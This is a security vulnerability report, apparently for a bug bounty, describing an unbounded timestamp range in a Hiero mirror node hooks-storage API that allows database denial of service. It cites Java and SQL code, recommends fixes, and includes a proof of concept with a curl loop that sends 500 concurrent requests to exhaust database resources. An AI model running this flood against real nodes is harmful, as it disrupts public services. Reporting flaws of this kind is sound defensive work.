### Title
Unbounded Timestamp Range in `getHookStorageChange()` Enables Full Historical Table Scan DoS

### Summary
An unauthenticated attacker can supply `timestamp=gte:0` to the Hook Storage API endpoint, causing `getAdjustedLowerRangeValue()` to return `0` and `adjustUpperBound()` to return `Long.MAX_VALUE`. This forces the `DISTINCT ON (key)` PostgreSQL query to scan every historical record for the targeted hook with no timestamp ceiling, enabling repeated resource exhaustion against the database.

### Finding Description

**Exact code path:**

In `HooksController.java` line 186, `Bound.of(timestamps, TIMESTAMP, ...)` is called with `primarySortField = false`:

```java
final var bound = Bound.of(timestamps, TIMESTAMP, HookStorageChange.HOOK_STORAGE_CHANGE.CONSENSUS_TIMESTAMP);
```

Inside `Bound.of()` (lines 169–182 of `Bound.java`), the constructor is invoked with `primarySortField = false`. The range-validity check at line 58 of `Bound.java` is:

```java
if (primarySortField && adjustedLower > adjustedUpper) {
    throw new IllegalArgumentException(...);
}
```

Because `primarySortField` is `false`, **no range validation is performed** for the timestamp bound.

**Root cause — `Bound.java` lines 63–97:**

```java
public long adjustUpperBound() {
    if (this.upper == null) {
        return Long.MAX_VALUE;   // ← triggered when no upper bound supplied
    }
    ...
}

public long getAdjustedLowerRangeValue() {
    if (this.lower == null) {
        return 0;
    }
    long lowerBound = this.lower.value();
    if (this.lower.operator() == RangeOperator.GT) {
        lowerBound++;
    }
    return lowerBound;   // ← returns 0 when operator=GTE and value=0
}
```

**Exploit flow:**

1. Attacker sends: `GET /api/v1/accounts/0.0.123/hooks/1/storage?timestamp=gte:0`
2. `TimestampParameter.valueOf("gte:0")` succeeds — the regex `^((eq|gt|gte|lt|lte|ne):)?(\d{1,17})(\.\d{1,9})?$` accepts it, producing `TimestampParameter(GTE, 0)`.
3. `Bound.of()` sets `lower = TimestampParameter(GTE, 0)`, `upper = null`.
4. `Bound.isEmpty()` → `false` → `isHistorical()` → `true` → `getHookStorageChange()` is entered.
5. `getAdjustedLowerRangeValue()` → `0`; `adjustUpperBound()` → `Long.MAX_VALUE`.
6. The repository query (`HookStorageChangeRepository.java` lines 15–39) executes:
   ```sql
   SELECT DISTINCT ON (key) ...
   FROM hook_storage_change
   WHERE owner_id = :ownerId
     AND hook_id = :hookId
     AND key >= :keyLowerBound
     AND key <= :keyUpperBound
     AND consensus_timestamp BETWEEN 0 AND 9223372036854775807
   ```
7. `DISTINCT ON (key)` with `ORDER BY key ASC, consensus_timestamp DESC` forces PostgreSQL to sort and scan **all** historical rows for that `(owner_id, hook_id)` pair before applying the LIMIT. The LIMIT (max 100) is applied **after** the full `DISTINCT ON` resolution.

**Why existing checks fail:**

- `@Size(max = 2)` on `timestamps` only limits the count of parameters, not their values.
- `@Positive @Max(MAX_LIMIT)` on `limit` caps returned rows but does not prevent the full internal scan.
- The `primarySortField = false` flag in `Bound.of()` deliberately skips the lower > upper guard.
- No authentication or rate-limiting annotations are present on the endpoint.

### Impact Explanation
Every request with `timestamp=gte:0` causes PostgreSQL to perform an unbounded sequential scan over all `hook_storage_change` rows for the targeted hook, resolving `DISTINCT ON` before truncating to the page limit. Concurrent flood of such requests exhausts DB CPU, I/O, and connection pool resources. Because `owner_id` and `hook_id` are public blockchain data, the attacker needs no credentials. Sustained attack can degrade or halt query processing for the entire mirror node, blocking all transaction confirmation queries — matching the stated "network unable to confirm new transactions" severity.

### Likelihood Explanation
The exploit requires zero privileges: the endpoint is a public HTTP GET, the parameter `timestamp=gte:0` is syntactically valid and passes all declared validators, and the target identifiers (`owner_id`, `hook_id`) are publicly enumerable from the same API. The attack is trivially scriptable and repeatable. Any actor aware of the API surface can execute it.

### Recommendation
1. **Enforce an upper timestamp bound when only a lower bound is supplied.** In `Bound.of()` (or in `HooksController.hookStorageChangeRequest()`), reject or cap requests where `upper == null` for the timestamp parameter in historical queries.
2. **Add a maximum allowed timestamp range.** Introduce a configurable `MAX_TIMESTAMP_RANGE_NANOS` constant and throw `IllegalArgumentException` if `adjustUpperBound() - getAdjustedLowerRangeValue() > MAX_TIMESTAMP_RANGE_NANOS`.
3. **Require both bounds for historical queries.** Validate in `getHookStorageChange()` that `timestamp.hasLowerAndUpper()` or that the operator is `EQ`/`LTE` (point-in-time), rejecting open-ended lower-only ranges.
4. **Add rate limiting** on the `/hooks/{hookId}/storage` endpoint.

### Proof of Concept

```
# Step 1: Identify any valid owner and hook ID (public data)
GET /api/v1/accounts/0.0.123/hooks

# Step 2: Trigger unbounded historical scan
GET /api/v1/accounts/0.0.123/hooks/1/storage?timestamp=gte:0

# Expected: query executes with BETWEEN 0 AND 9223372036854775807
# Step 3: Flood with concurrent requests to exhaust DB resources
for i in $(seq 1 500); do
  curl -s "http://<mirror-node>/api/v1/accounts/0.0.123/hooks/1/storage?timestamp=gte:0" &
done
wait
```

**Verification of bound values:**
- `TimestampParameter.valueOf("gte:0")` → `operator=GTE, value=0` ✓
- `Bound.getAdjustedLowerRangeValue()` → `0` (GTE, no increment) ✓
- `Bound.adjustUpperBound()` → `Long.MAX_VALUE` (upper is null) ✓
- `isHistorical()` → `true` (lower is non-null) ✓
- SQL: `consensus_timestamp BETWEEN 0 AND 9223372036854775807` ✓ [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/HookServiceImpl.java (L97-99)
```java
        final var timestamp = request.getTimestamp();
        final long timestampLowerBound = timestamp.getAdjustedLowerRangeValue();
        final long timestampUpperBound = timestamp.adjustUpperBound();
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/Bound.java (L56-60)
```java
        long adjustedLower = getAdjustedLowerRangeValue();
        long adjustedUpper = adjustUpperBound();
        if (primarySortField && adjustedLower > adjustedUpper) {
            throw new IllegalArgumentException("Invalid range provided for %s".formatted(parameterName));
        }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/Bound.java (L63-74)
```java
    public long adjustUpperBound() {
        if (this.upper == null) {
            return Long.MAX_VALUE;
        }

        long upperBound = this.upper.value();
        if (this.upper.operator() == RangeOperator.LT) {
            upperBound--;
        }

        return upperBound;
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/Bound.java (L86-97)
```java
    public long getAdjustedLowerRangeValue() {
        if (this.lower == null) {
            return 0;
        }

        long lowerBound = this.lower.value();
        if (this.lower.operator() == RangeOperator.GT) {
            lowerBound++;
        }

        return lowerBound;
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/Bound.java (L169-182)
```java
    public static Bound of(TimestampParameter[] timestamp, String parameterName, Field<Long> field) {
        if (timestamp == null || timestamp.length == 0) {
            return Bound.EMPTY;
        }

        for (int i = 0; i < timestamp.length; ++i) {
            final var param = timestamp[i];
            if (param.operator() == RangeOperator.EQ) {
                timestamp[i] = new TimestampParameter(RangeOperator.LTE, param.value());
            }
        }

        return new Bound(timestamp, false, parameterName, field);
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/repository/HookStorageChangeRepository.java (L15-39)
```java
    @Query(nativeQuery = true, value = """
                    select distinct on (key)
                         owner_id,
                         hook_id,
                         key,
                         value_written       as "value",
                         consensus_timestamp as "modified_timestamp",
                         consensus_timestamp as "consensus_timestamp",
                         0                   as "created_timestamp",
                         (value_written is null or length(value_written) = 0) as "deleted"
                    from hook_storage_change
                    where owner_id = :ownerId
                      and hook_id = :hookId
                      and key >= :keyLowerBound
                      and key <= :keyUpperBound
                      and consensus_timestamp between :timestampLowerBound and :timestampUpperBound
                    """)
    List<HookStorage> findByKeyBetweenAndTimestampBetween(
            long ownerId,
            long hookId,
            byte[] keyLowerBound,
            byte[] keyUpperBound,
            long timestampLowerBound,
            long timestampUpperBound,
            Pageable pageable);
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/controller/HooksController.java (L110-113)
```java
            @RequestParam(name = TIMESTAMP, required = false, defaultValue = "") @Size(max = 2)
                    TimestampParameter[] timestamps,
            @RequestParam(defaultValue = DEFAULT_LIMIT) @Positive @Max(MAX_LIMIT) int limit,
            @RequestParam(defaultValue = "asc") Direction order) {
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/parameter/TimestampParameter.java (L15-16)
```java
    private static final Pattern PATTERN =
            Pattern.compile("^((eq|gt|gte|lt|lte|ne):)?(\\d{1,17})(\\.(\\d{1,9}))?$", Pattern.CASE_INSENSITIVE);
```
